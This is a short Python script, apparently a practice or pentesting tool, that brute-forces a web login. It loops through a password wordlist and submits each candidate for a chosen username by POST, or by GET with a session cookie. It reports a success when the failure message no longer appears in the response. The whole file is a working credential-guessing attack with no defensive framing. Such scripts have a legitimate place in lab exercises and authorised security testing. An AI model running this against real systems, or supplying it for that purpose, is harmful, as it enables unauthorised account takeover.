import requests
from termcolor import colored

def brute_force_login(username, url, password_file, login_failed_string, cookie_value=""):
    with open(password_file, 'r') as password_file:
        passwords = password_file.readlines()

    for password in passwords:
        password = password.strip()
        print(colored(f'Trying: {password}', 'red'))
        data = {'username': username, 'password': password, 'Login': 'submit'}

        if cookie_value:
            response = requests.get(url, params={'username': username, 'password': password, 'Login': 'Login'}, cookies={'Cookie': cookie_value})
        else:
            response = requests.post(url, data=data)

        if login_failed_string not in response.text:
            print(colored(f'[+] Found Username: {username}', 'green'))
            print(colored(f'[+] Found Password: {password}', 'green'))
            return

    print('[!!] Password Not In List')

if __name__ == '__main__':
    url = input('[+] Enter Page URL: ')
    username = input('[+] Enter Username For The Account To Bruteforce: ')
    password_file = input('[+] Enter Password File To Use: ')
    login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
    cookie_value = input('Enter Cookie Value (Optional): ')

    brute_force_login(username, url, password_file, login_failed_string, cookie_value)
